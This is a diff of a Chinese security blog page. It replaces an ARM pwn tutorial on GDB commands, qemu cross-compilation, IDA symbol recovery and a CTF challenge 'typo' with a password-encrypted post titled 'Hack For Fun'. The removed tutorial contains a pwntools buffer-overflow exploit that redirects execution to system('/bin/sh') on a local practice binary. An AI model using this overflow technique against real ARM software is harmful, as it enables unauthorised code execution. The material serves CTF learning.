@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/07/05/armpwn入门/"/>
+  <link rel="canonical" href="http://example.com/2022/05/29/hack-for-fun/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,21 +31,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>armpwn入门 - 1ens's blog</title>
-  <meta name="keywords" content="arm,null">
-  <meta desc name="description" content="a - 1ens - 1ens's blog">
+  <title>Hack For Fun - 1ens's blog</title>
+  <meta name="keywords" content="解语,null">
+  <meta desc name="description" content="有东西被加密了, 请输入密码查看. - 1ens - 1ens's blog">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="armpwn入门">
-<meta property="og:url" content="http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:title" content="Hack For Fun">
+<meta property="og:url" content="http://example.com/2022/05/29/Hack-for-fun/index.html">
 <meta property="og:site_name" content="1ens&#39;s blog">
-<meta property="og:description" content="调试  常用命令info functions ：显示程序的使用的函数 disassemble 函数名 ：反汇编指定函数  查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt;  n是一个正整数，表示显示内存的长度f 表示显示的格式 u表示从当前地址往后请求的字节数(u参数可以用下面的字符来代替b表示单字节，h表示双字节，w表示四字节，g表示八字节) 编译arm架构程序并用qem">
+<meta property="og:description" content="有东西被加密了, 请输入密码查看.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-07-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-07-05T13:57:05.731Z">
+<meta property="article:published_time" content="2022-05-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-25T12:41:38.169Z">
 <meta property="article:author" content="1ens">
-<meta property="article:tag" content="arm">
+<meta property="article:tag" content="解语">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2526,7 +2526,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/29/Hack-for-fun/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="1ens's blog">
   </span>
@@ -2547,7 +2547,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        armpwn入门
+        Hack For Fun
       </h1>
       <div class='new-meta-box'>
         
@@ -2566,10 +2566,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/pwn/">pwn</a>
+    <a class="category-link" href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/pwn/" itemprop="url"><span itemprop="name">pwn</span></a>
+        <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url"><span itemprop="name">杂谈</span></a>
       </span>
     
   </div>
@@ -2578,10 +2578,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-07-05T00:00:00+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-05-29T00:00:00+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2022年7月5日</p>
+    <p>发布于：2022年5月29日</p>
   </a>
 </div>
 
@@ -2616,45 +2616,18 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207051416592.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207051416592.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207051418503.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207051418503.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<div class="story post-story"><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>info functions ：显示程序的使用的函数</p>
-<p>disassemble 函数名 ：反汇编指定函数</p>
-<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207051500207.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207051500207.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; <addr></p>
-<p>n是一个正整数，表示显示内存的长度f 表示显示的格式</p>
-<p>u表示从当前地址往后请求的字节数(u参数可以用下面的字符来代替b表示单字节，h表示双字节，w表示四字节，g表示八字节)</p>
-<h1 id="编译arm架构程序并用qemu执行"><a href="#编译arm架构程序并用qemu执行" class="headerlink" title="编译arm架构程序并用qemu执行"></a>编译arm架构程序并用qemu执行</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">arm-linux-gnueabihf-gcc -g hello.c -o eastgets</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">qemu执行 动态链接程序，需要指定libc的位置</span></span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabihf/ ./eastgets</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052019907.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052019907.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<h1 id="typo-例题"><a href="#typo-例题" class="headerlink" title="typo(例题)"></a>typo(例题)</h1><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052051641.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052051641.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>32位arm小端，静态编译，没有符号表</p>
-<h3 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h3><p>对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/134980.html">https://www.freebuf.com/articles/terminal/134980.html</a></p>
-<p>arm架构的libc在 &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib里面</p>
-<p>尝试恢复符号表：</p>
-<p>（1）下载对应libc.so</p>
-<p>sudo apt install libc6-armhf-cross cp &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib&#x2F;libc-2.23.so .&#x2F;</p>
-<p>（2）下载rizzo插件</p>
-<p>使用rizzo插件：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/fireundubh/IDA7-Rizzo">https://github.com/fireundubh/IDA7-Rizzo</a></p>
-<p>放入：C:\Program Files\IDA 7.0\plugins</p>
-<p>（3）用IDA打开libc-2.23.so</p>
-<p>导出libc.23.so.riz:</p>
-<p>File-&gt;Produce file-&gt;Rizzo signature file</p>
-<p>（4）打开目标程序</p>
-<p>加载.riz:</p>
-<p>File-&gt;Load file-&gt;Rizzo signature file</p>
-<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052140423.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052140423.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>溢出函数</p>
-<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052141366.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052141366.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值 保存在寄存器r0中。</p>
-<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052153322.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207052153322.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>找到0x20904，将“&#x2F;bin&#x2F;sh”地址赋给r0，并将system的地址赋给pc，就可以执行system(“&#x2F;bin&#x2F;sh”)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">112</span> + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>)*<span class="number">2</span> + p32(<span class="number">0x110b4</span>)</span><br><span class="line">p = process(<span class="string">&quot;./typo&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;----&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
+    <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="c4472ddce6ff6c78de2098239ddcd7d9b8b781d27dbf6e8a3e3b388d8f939777">c516531d8dc397363af3dbbf8b155c576f834e3abc39fcec9d221cfb2863b6d71b888aee3b0127e306aea9980fcec5bf755faedcb0af6e6f6accf6daaba2a129db809978b8d02c3f612736960ecb3baca264a27d9db697eab269079b16033015a97717d27c0514715444803dccec8631c6ff24fa95fa34634dc60f14c3cc5515411e37a2ce64f19b150b8783c5f1bfe4089b740ae3cc41020fa65573fbbf1785e87abc6fa6157a08f41fbffa58fd6f604ba645d84d2ff20e7fb9fda0fc6f4365e7f8e535b141a3f1efb4d6e14f76fe38ec70543c51ac68e2eafea34c6e47527c4bc04316de9d5a739b0b1faed3e0522098103df341181b067f691eeaf9cf9fceff464a64c09f509ba0c3ae5605e6367c456c415b89c30ee941dd460c3f4493d064f28b01e181ed93f308f3806d335c6d2de5c761811083a772a48599fec4b728719322d1efc858c9f9257088f23fbb1345b5022ecbd4b3542fa58e5d4ae63b84cfd2ea00464b9f66f2b2eab10a131f4cf2356327ec34c6a425ce65adcf61ae6ad824c5e298d66ccffcbd3995d5c3e3666501084a17594df1733cb586228c595f3195e5643607ac5ed7bb6f0217c2543f022a1d9912acd4489115d4309d36924b597f9ac950c658a580c974db9d72d35d0ad597301b6ee7f836e9cc60c4d2daf8e9a77cfadf14647ca0635b1104ca92105bde6db7f81f888b99e291ba6da33998c5f59a1ad9ecbe999515eb1d7a392e2f6cdced4202b9e2e2bc25f9855c0855ab3b0b9d4759242dd4521759e5d6eb961905508537d181b6b955f6f3d15c352824ac0dea10e387fd4178ab991b875510285e3eed9d3f90b9105e6b23a30defd1d3a42ff1e8eb9fdd23146ecb8c717f436495793a1bd23218196263f6d48fd1605bd3d9f780dc43bce0f0f548052cf9f9e8c747e05b5da6152569063b1d98a66dc9610f3f0ee3c720723692f170f592e640326105934415273689684ede3e7c6d8d75ba2b633a41bb04b08b2f56e4089e1b26b33fecbe97af7e5e50232f600f08f1288a96dce566a585e851b32d1935babbd9d8bc72d68d63295e93c6985853b652399d338d3925a3e1649bde14e031ce536b542a7a227b41453192fd47e43ebaa0e6dcbfe9866b1193fb629184532e5b9cb4b6dcdfe85c41fb81129d154e4bc0c2466a768b87346a27f36f2e98007bffd5e7e5e4a8783111d62fea5d099198923bc4f98d32707b0b85a0b74d6525899ce1c06d346cb079fc08926772da3c2d5e836874ef1e078707a45c7680bf682ca4ad56d6a0a9541ed9c4818d8d40f5972ee920154db70fb9d62a60dfaefa1c1259ce0eb0fa9e7721406c602f7214da727c4bd73484b61a5fe826c97eabd1ff1c21ded4676fe645e55815c669abd3f2bc31a85b20e2ab815d4dfaaaa21600dfe7b891783f08bbac3eda4445eaff57f4d516e8f2e177325655dd5c405adcb132c3a70f7cb747eb40f4361092163ae943d0908d63ae6f802e6df18b10cb689f32677240c53401287f72efa4e7d41791a2c58e59db622d070d7902fab3d83ed53dfcd061f6aad56dab79b94a4858f256e7f0e7fa734d1c9e30f2342e6d8690d3daf274dec21a192bd0408ffb91a942c24d6aa08763e2515f9620d0310728b8ee6478dd250f2d37a6c9c49b7ae22a9d11a938102d42e4f9a5f82fe4fc25467481444a3b29e05526aefd07e5d7c4329f7343c74c2e3a44e8f5924e32aba49d1c69459a582c1541c062647a293f35edde3ecda96fc0701000837383361e883c90067af3e62a9c7c9ee5436d18936989758e61c4a8b6d42ebaccfbe7aed6c7bc8426ef9e47b06d04f21c630aa851614b772713428cad252ed7256868dab397a3dcec2b2982c6d21a4260ac5d5126cd16cfeffcd7d2dfb349fb652ecc45f31e925b213d3be7e6e74aa8811fd9a76f4b558d26bce3583fe716a5b92e235851a98e72db47aa04735c4d50930206d183a0910bc48c27579fc5641e00d6dde08c251c10a8a8667499e2d5c1ae80e2d5126a1eaf13d6999ba82b4561ca4e9c7c2ee0b28da6ef7a1464189b0827670301efa46684cc31103a1e6069c839545942e79293e4b84347c2f494f0152ebc9f4f58d1c5c1d23c5c49b0d6e99902742c507a11a72bbd7e638d3d291c39cde038f9ddcd31bc380ad6aa41ba672dae9e2689f144fad9e1ded690bf</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
+      </label>
+    </div>
+  </div>
 </div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
   </div>
   
   
@@ -2672,7 +2645,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
               
             
               
-                <p>本文永久链接是：<a href=http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/>http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/</a></p>
+                <p>本文永久链接是：<a href=http://example.com/2022/05/29/Hack-for-fun/>http://example.com/2022/05/29/Hack-for-fun/</a></p>
               
             
           </blockquote>
@@ -2689,10 +2662,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-07-05T21:57:05+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-08-25T20:41:38+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2022年7月5日</p>
+    <p>更新于：2022年8月25日</p>
   </a>
 </div>
 
@@ -2701,8 +2674,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/arm/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>arm</p></a></div>
-  <span hidden itemprop="keywords">arm</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E8%A7%A3%E8%AF%AD/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>解语</p></a></div>
+  <span hidden itemprop="keywords">解语</span>
 
 
         
@@ -2715,7 +2688,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/&title=armpwn入门 - 1ens's blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/05/29/Hack-for-fun/&title=Hack For Fun - 1ens's blog&summary=有东西被加密了, 请输入密码查看."
           
           >
           
@@ -2727,7 +2700,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/&title=armpwn入门 - 1ens's blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/05/29/Hack-for-fun/&title=Hack For Fun - 1ens's blog&summary=有东西被加密了, 请输入密码查看."
           
           >
           
@@ -2739,7 +2712,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/&title=armpwn入门 - 1ens's blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/05/29/Hack-for-fun/&title=Hack For Fun - 1ens's blog&summary=有东西被加密了, 请输入密码查看."
           
           >
           
@@ -2772,33 +2745,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>栈溢出</p>
-          <p class='content'>ret2syscallLinux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数
-应用程序调用系统调用的过程是：
-1、把系统调用的编号存入 EAX
-2、把函数参数存入其它通用寄...</p>
+        <a class='prev' href='/2022/05/30/%E7%A2%8E%E7%A2%8E%E5%BF%B5/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>碎碎念</p>
+          <p class='content'>
+  47b49a4a2f06ffaeeb6d37e9691a4c66766fbc2abbcca162abc5974893942ce963e5e612308ca60d3a87bedbb25e81...</p>
         </a>
       
       
-        <a class='next' href='/2022/07/03/Mips%E5%9F%BA%E7%A1%80/'>
-          <p class='title'>mips基础<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>基本特点
-寄存器
-流水线操作
-寻址方式
-指令格式
-指令集基础运算
-
-逻辑运算
-移位运算
-访存
-跳转
-CPU控制指令
-其他指令
-MIPS 汇编 | FreeFlyingSheep 的小站
-
-</p>
+        <a class='next' href='/2022/05/28/JIT/'>
+          <p class='title'>JIT<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>什么是JITJIT &#x3D; Just In Time即时编译，是动态编译的一种形式，是一种优化虚拟机运行的技术。程序运行通常有两种方式，一种是静态编译，一种是动态解释，即时编译混合了这二者...</p>
         </a>
       
     </div>
@@ -2814,7 +2770,7 @@ MIPS 汇编 | FreeFlyingSheep 的小站
 
   <article class="post white-box shadow floatable" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/07/05/armpwn%E5%85%A5%E9%97%A8/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/05/29/Hack-for-fun/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2837,19 +2793,9 @@ MIPS 汇编 | FreeFlyingSheep 的小站
 
 
 
-  <section class="widget toc-wrapper shadow floatable desktop mobile pjax" id="toc-div" >
-    
-  <header>
-    
-      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
-    
-  </header>
-
-
-    <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-text">恢复符号表</span></a></li></ol></li></ol>
-    </div>
-  </section>
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   
 
@@ -4168,7 +4114,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"a"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"1ens's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/pwn/","name":"pwn"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/07/05/armpwn入门/","name":"armpwn入门"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"1ens's blog","url":"http://example.com/","keywords":null,"description":"a","author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"a"},"publisher":{"@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"armpwn入门","description":"a","inLanguage":["zh-CN","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/"},"author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"1ens's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/","wordCount":0,"datePublished":"2022-07-04T16:00:00.000Z","dateModified":"2022-07-05T13:57:05.731Z","articleSection":"pwn","keywords":"arm","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"a"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"1ens's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/杂谈/","name":"杂谈"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/05/29/Hack-for-fun/","name":"Hack For Fun"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"1ens's blog","url":"http://example.com/","keywords":null,"description":"a","author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"a"},"publisher":{"@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Hack For Fun","description":"有东西被加密了, 请输入密码查看.","inLanguage":["zh-CN","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/05/29/Hack-for-fun/"},"author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"1ens's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/05/29/Hack-for-fun/","wordCount":17,"datePublished":"2022-05-28T16:00:00.000Z","dateModified":"2022-08-25T12:41:38.169Z","articleSection":"杂谈","keywords":"解语","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
